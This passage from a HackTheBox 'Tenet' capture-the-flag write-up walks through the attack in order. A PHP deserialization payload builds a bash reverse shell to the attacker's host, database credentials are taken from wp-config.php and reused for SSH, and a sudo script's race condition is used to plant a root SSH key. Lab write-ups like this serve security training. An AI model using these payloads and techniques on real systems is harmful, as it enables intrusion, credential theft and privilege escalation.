</span></span><span class="line"><span class="cl"> :: Matcher          : Response status: <span class="m">200</span>
</span></span><span class="line"><span class="cl"> :: Filter           : Response lines: <span class="m">376</span>
</span></span><span class="line"><span class="cl">________________________________________________
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">:: Progress: <span class="o">[</span>93/93<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">11</span> req/sec :: Duration: <span class="o">[</span>0:00:05<span class="o">]</span> :: Errors: <span class="m">0</span> ::
</span></span></code></pre></div><h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
<p>The files that user Neil talking about was found at  <code>http://10.10.10.223/[here]</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://10.10.10.223/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:04 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:05 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Last-Modified: Thu, <span class="m">17</span> Dec <span class="m">2020</span> 09:52:50 GMT
</span></span><span class="line"><span class="cl">ETag: <span class="s2">&#34;202-5b6a5f47911e4&#34;</span>
</span></span><span class="line"><span class="cl">Accept-Ranges: bytes
</span></span><span class="line"><span class="cl">Content-Length: <span class="m">514</span>
</span></span><span class="line"><span class="cl">Content-Type: application/x-trash
</span></span></code></pre></div><p>Another guessing, here the keyword is &ldquo;Migration&rdquo;, so I think that before they moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
<p>Poking <code>Sator.php</code> results the following contents:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.223/sator.php
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
</span></span><span class="line"><span class="cl"><span class="o">[]</span> Database updated &lt;br&gt;
</span></span></code></pre></div><p>Poking <code>sator.php.bak</code> returns PHP codes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31» 
</span></span><span class="line"><span class="cl">$ curl -s http://10.10.10.223/sator.php.bak
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">class DatabaseExport
</span></span><span class="line"><span class="cl"><span class="o">{</span>
</span></span><span class="line"><span class="cl">        public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">&#39;users.txt&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        public <span class="k">function</span> update_db<span class="o">()</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">                <span class="nb">echo</span> <span class="s1">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span>-&gt; <span class="nv">data</span> <span class="o">=</span> <span class="s1">&#39;Success&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        public <span class="k">function</span> __destruct<span class="o">()</span>
</span></span><span class="line"><span class="cl">        <span class="o">{</span>
</span></span><span class="line"><span class="cl">                file_put_contents<span class="o">(</span>__DIR__ . <span class="s1">&#39;/&#39;</span> . <span class="nv">$this</span> -&gt;user_file, <span class="nv">$this</span>-&gt;data<span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nb">echo</span> <span class="s1">&#39;[] Database updated &lt;br&gt;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        //      <span class="nb">echo</span> <span class="s1">&#39;Gotta get this working properly...&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;arepo&#39;</span><span class="o">]</span> ?? <span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$databaseupdate</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$input</span><span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$app</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$app</span> -&gt; update_db<span class="o">()</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">?&gt;
</span></span></code></pre></div><h3 id="source-code-analysis">Source Code Analysis</h3>
<h4 id="deserialization-vulnerability">Deserialization vulnerability</h4>
<p>From the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but from what I know is that the function will be called when there is no more references to an object (comment by me):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span> 
</span></span><span class="line"><span class="cl"><span class="c1">// __destruct is called afterwards
</span></span></span><span class="line"><span class="cl"><span class="c1">// [] Database updated will be printed out
</span></span></span></code></pre></div><p>Here is an example:</p>
<p><div class="img-container"><img src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  /></div>
</p>
<p>Furthermore, the user-controlled input with parameter <code>arepo</code> is directly passed to <code>unserialize()</code> function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="insecure-deserialization-attack---poc">Insecure Deserialization attack - PoC</h4>
<p>From the previous code, <code>unserialize</code> is called before the creation of object (<code>$app</code>), so I will use the opposite magic function called <code>__construct()</code>.</p>
<p>I&rsquo;ll do some testing with this script below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DatabaseExport</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>I use URL encode there because I&rsquo;m going to use <code>curl</code> to interact with the site. I will save the script to a file called <code>tenetization.php</code>.</p>
<p>I will run that script and copy the output. If I don&rsquo;t have PHP, I could use <a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler">this site</a> to get output of my PHP script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ php tenetization.php
</span></span><span class="line"><span class="cl">O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D
</span></span></code></pre></div><p>I&rsquo;ll send that output to <code>sator.php</code> via <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ curl -sI <span class="s2">&#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D&#34;</span>
</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span> OK
</span></span><span class="line"><span class="cl">Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 12:43:43 GMT
</span></span><span class="line"><span class="cl">Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</span></span></code></pre></div><p>When I visit <code>10.10.10.223/test.php</code>, it returns the PHP info page, which means I have a code execution.</p>
<p><div class="img-container"><img src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  /></div>
</p>
<p>Based on 0xdf&rsquo;s awesome <a href="https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#create-serialized-object">writeup</a>,  this payload would also works:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DatabaseExport</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="nx">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">		<span class="k">public</span> <span class="nx">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><h4 id="insecure-deserialization-attack---weaponize">Insecure Deserialization attack - Weaponize</h4>
<p>This time, I&rsquo;ll modify the file name and the data for reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">DatabaseExport</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;iamf.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php system(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/443 0&gt;&amp;1&#39; </span><span class="se">\&#34;</span><span class="s2">) ?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></div><p>I&rsquo;ll script the exploitation step and then wait on my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="nv">serial</span><span class="o">=</span><span class="sb">`</span>php tenetization.php<span class="sb">`</span>
</span></span><span class="line"><span class="cl">curl -s http://10.10.10.223/sator.php?arepo<span class="o">=</span><span class="nv">$serial</span>
</span></span><span class="line"><span class="cl">sleep 5<span class="p">;</span>
</span></span><span class="line"><span class="cl">curl -s http://10.10.10.223/iamf.php
</span></span></code></pre></div><p>When I run the exploit, it hangs.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «exploits» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ bash tenetization.sh
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
</span></span><span class="line"><span class="cl"><span class="o">[]</span> Database updated &lt;br&gt;<span class="o">[]</span> Database updated &lt;br&gt;
</span></span></code></pre></div><p>But after a few seconds, I have a shell on my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «~» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ nc -nvlp <span class="m">443</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223<span class="o">]</span> <span class="m">39174</span>
</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1545<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
</span></span><span class="line"><span class="cl">bash: no job control in this shell
</span></span><span class="line"><span class="cl">www-data@tenet:/var/www/html$ id
</span></span><span class="line"><span class="cl">id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</span></span><span class="line"><span class="cl">www-data@tenet:/var/www/html$
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614195508219.png" alt="image-20210614195508219"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-neil">Shell as neil</h3>
<h4 id="wp-config">WP config</h4>
<p>Inside the <code>wp-config.php</code> file, there is a database credential.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
</span></span><span class="line"><span class="cl">cat wp-config.php
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;wordpress&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database username */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;neil&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/** MySQL database password */
</span></span><span class="line"><span class="cl">define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;Opera2112&#39;</span> <span class="o">)</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
<p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31»
</span></span><span class="line"><span class="cl">$ ssh neil@10.10.10.223
</span></span><span class="line"><span class="cl">neil@10.10.10.223<span class="err">&#39;</span>s password:
</span></span><span class="line"><span class="cl">Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Last login: Mon Jun <span class="m">14</span> 12:57:27 <span class="m">2021</span> from 10.10.16.12
</span></span><span class="line"><span class="cl">neil@tenet:~$ id
</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
</span></span></code></pre></div><p>User&rsquo;s flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ ls -l
</span></span><span class="line"><span class="cl">total <span class="m">4</span>
</span></span><span class="line"><span class="cl">-r-------- <span class="m">1</span> neil neil <span class="m">33</span> Jun <span class="m">14</span> 06:46 user.txt
</span></span></code></pre></div><p><div class="img-container"><img src="imgs/image-20210614200613572.png" alt="image-20210614200613572"  /></div>
</p>
<hr>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo-privileges">Sudo privileges</h4>
<p>User neil has sudo privileges on a custom script called <code>enableSSH.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> neil on tenet:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User neil may run the following commands on tenet:
</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
</span></span><span class="line"><span class="cl">neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
</span></span><span class="line"><span class="cl">-rwxr-xr-x <span class="m">1</span> root root <span class="m">1080</span> Dec  <span class="m">8</span>  <span class="m">2020</span> /usr/local/bin/enableSSH.sh
</span></span></code></pre></div><h4 id="script-analysis">Script analysis</h4>
<p>The following is the contents of <code>enableSSH.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl">checkAdded<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">sshName</span><span class="o">=</span><span class="k">$(</span>/bin/echo <span class="nv">$key</span> <span class="p">|</span> /usr/bin/cut -d <span class="s2">&#34; &#34;</span> -f 3<span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">checkFile<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">[[</span> ! -s <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> ! -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Error in creating key file!&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="o">[[</span> -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                <span class="nb">exit</span> <span class="m">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">addKey<span class="o">()</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="o">(</span><span class="nb">umask</span> 110<span class="p">;</span> touch <span class="nv">$tmpName</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /bin/echo <span class="nv">$key</span> &gt;&gt;<span class="nv">$tmpName</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        checkFile <span class="nv">$tmpName</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /bin/cat <span class="nv">$tmpName</span> &gt;&gt;/root/.ssh/authorized_keys
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        /bin/rm <span class="nv">$tmpName</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">key</span><span class="o">=</span><span class="s2">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
</span></span><span class="line"><span class="cl">addKey
</span></span><span class="line"><span class="cl">checkAdded
</span></span></code></pre></div><p>The contents of the <code>$key</code> variable will be saved to a temporary file at <code>/tmp/SSH-randomfilename</code> before being added to the <code>/root/.ssh/authorized_keys</code> file by the <code>addKey()</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
</span></span><span class="line"><span class="cl">neil@tenet:~$ <span class="nb">echo</span> <span class="nv">$tmpName</span>
</span></span><span class="line"><span class="cl">/tmp/ssh-4swbpcnN
</span></span></code></pre></div><p>Then the  <code>checkAdded()</code> function will take the  <code>username@hostname</code> part from the value of <code>$key</code> which is <code>root@ubuntu</code> and check if it already exist in <code>/root/.ssh/authorized_keys</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span>
</span></span><span class="line"><span class="cl">                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">fi</span>
</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
</span></span></code></pre></div><p>The idea here is if I could overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I should be able to log in as root using my private key. So, it&rsquo;s a race condition.</p>
<h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
<p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
<p>First, I&rsquo;ll put my public key at Neil&rsquo;s home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf&#39;</span> &gt; .iamf
</span></span></code></pre></div><p>And Then I&rsquo;ll run this loop to keep user <code>neil</code> executing sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> sudo /usr/local/bin/enableSSH.sh<span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</span></span></code></pre></div><p>I&rsquo;ll open another neil&rsquo;s session and run this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">neil@tenet:~$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> cat .iamf <span class="p">|</span> tee /tmp/ssh-*<span class="p">;</span><span class="k">done</span>
</span></span></code></pre></div><p>On my Kali, I will do SSH login in loop.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@kali «tenet» «10.10.14.31»
